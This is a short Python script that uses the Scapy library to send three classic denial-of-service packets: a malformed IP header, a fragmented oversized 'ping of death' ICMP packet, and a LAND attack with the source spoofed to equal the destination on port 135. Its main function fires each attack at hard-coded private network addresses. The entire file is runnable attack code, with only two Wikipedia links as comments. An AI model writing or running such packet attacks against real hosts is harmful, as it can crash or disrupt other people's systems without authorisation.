#!/usr/bin/env python3
from scapy.all import IP, ICMP, TCP, UDP, sr, send, fragment

def malformed_packet_attack(host): 
    send(IP(dst=host, ihl=2, version=3)/ICMP())

def ping_of_death_attack(host):
    # https://en.wikipedia.org/wiki/Ping_of_death
    send(fragment(IP(dst=host)/ICMP()/("X"*60000)))

def land_attack(host):
    # https://en.wikipedia.org/wiki/Denial-of-service_attack 
    send(IP(src=host, dst=host)/TCP(sport=135,dport=135))

def main():
    print("** malformed_packet_attack **")
    malformed_packet_attack("192.168.0.41")

    print("** ping_of_death_attack **")
    ping_of_death_attack("192.168.0.40")

    print("** land_attack **")
    land_attack("192.168.0.40")

if __name__ == "__main__":
    main()